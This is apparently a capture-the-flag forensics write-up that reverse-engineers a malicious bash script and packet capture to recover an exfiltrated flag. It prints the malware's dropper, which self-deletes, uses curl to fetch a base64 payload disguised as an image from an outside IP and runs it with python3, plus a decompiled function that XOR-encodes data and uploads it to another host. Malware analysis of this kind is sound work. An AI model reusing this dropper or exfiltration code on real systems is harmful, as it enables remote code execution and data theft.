---
layout: writeup
title: sneaky-script (forensics/rev)
date: 2021-11-07
---
# Problem
For this problem we're given a situation where a malicious program was detected on a victim's PC and provided a zip file containing a pcap (`evidence.pcap`) and a bash script (`mal.sh`).  Our goal is to determine what the malware did and recover the exfiltrated flag.

## Investigation
Opening the malicious bash script we see the following:
```bash
#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')

curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg
python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg
```

The interesting parts of this shell script are in the final two lines where we see it use curl to retrieve an image called `banner.png` which it decodes using base64 and then saves at `/tmpt/.cacheimg` and then ......executes using python?  Strange, let's investigate further.

Opening the pcap in wireshark we can extract a couple files: the `banner.png` and a conspicuous `upload` file that's 18kb large.

![image of export objects window in wireshark displaying several files](/assets/writeup_imgs/sneakyscript0.png)

Downloading the banner.png and decoding it ourselves, we can use the file utility we can confirm our earlier suspicions--this isn't a png image, it's python bytecode! 

Using [uncompyle6](https://github.com/rocky/python-uncompyle6/) we can translate the bytecode back into some valid python code.  Within the decompiled code we can find a `send()` function which we can see below:

```python
def send(data):
    c = http.client.HTTPConnection('34.207.187.90')
    p = json.dumps(data).encode()
    k = b'8675309'
    d = bytes([p[i] ^ k[(i % len(k))] for i in range(len(p))])
    c.request('POST', '/upload', base64.b64encode(d))
    x = c.getresponse()
```

It's XORing the data with the key `b'8675309'` and then uploading it as a base64 encoded file named `upload`!

# Solution
After decompiling the malicious python code, we can write a trivial function to decode & decrypt the stolen data.

```python
# Unencrypt stolen data from the packet-capture
from base64 import b64decode

with open("exfils/upload") as enc_f:
  content = b64decode(enc_f.read())

k = b'8675309'  
unc =  bytes([content[i] ^ k[(i % len(k))] for i in range(len(content))])
print(unc.decode())
# At this point just use redirect stdout  to a file, then cat & grep to find flag
```

## Conclusion & Lessons Learned:
Well for one, uncompyle6 is a super helpful tool and packet captures once again prove incredibly helpful!

At a higher-level, it's interesting to see a malicious program written in python, especially considering we often focus on C-built x86 binaries when doing CTF (specifically in many `pwn` challenges).  It's important we note that malware can come in many forms--even in a high-level 'modern' language like Python!



